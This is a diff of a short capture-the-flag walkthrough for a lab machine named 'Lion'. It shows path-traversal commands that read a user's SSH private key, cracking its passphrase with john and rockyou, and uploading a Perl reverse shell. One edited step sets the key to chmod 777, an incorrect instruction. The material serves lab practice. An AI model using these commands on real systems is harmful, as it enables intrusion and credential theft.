@@ -1,8 +1,8 @@
 # Lion
 ## Method 1
-3. http://lion.thm:5555/?page=../../../home/gloria/.ssh/id_rsa
-4. `chmod 600 id_rsa`
-5. `ssh2john id_rsa > for_john&&john for_john --wordlist=/usr/share/wordlists/rockyou.txt`
+3. `curl lion.thm:5555/?page=../../../../../../home/gloria/.ssh/id_rsa`
+4. `chmod 777 id_rsa`
+5. `ssh2john id_rsa > for_john&&john for_john --wordlist=/usr/share/wordlists/rockyou.txt`. The password is `dance`, you don't have to crack it.
 6. `ssh -i id_rsa gloria@lion.thm`
 ## Method 2
 ### ExploitDB
@@ -17,6 +17,7 @@
 ## Method 3
 1. http://lion.thm/upload/
 2. Executes `perl` file
+3. `cp /usr/share/webshells/perl/perl-reverse-shell.pl .` and configure the IP and PORT values.
 
 
 ## Privilage Esc. 1
